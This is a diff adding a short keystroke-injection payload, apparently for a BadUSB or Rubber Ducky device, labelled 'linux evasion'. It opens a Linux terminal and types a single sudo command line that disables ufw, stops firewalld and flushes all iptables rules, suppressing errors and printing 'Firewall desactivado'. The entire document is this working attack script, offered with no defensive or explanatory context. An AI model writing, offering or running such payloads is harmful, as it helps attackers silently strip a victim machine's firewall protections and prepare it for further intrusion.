@@ -1,0 +1,6 @@
+META linux evasion
+DELAY 1000
+CTRL ALT t
+DELAY 1200
+STRING sudo ufw disable 2>/dev/null; sudo systemctl stop firewalld 2>/dev/null; sudo iptables -F 2>/dev/null; echo "Firewall desactivado"
+ENTER
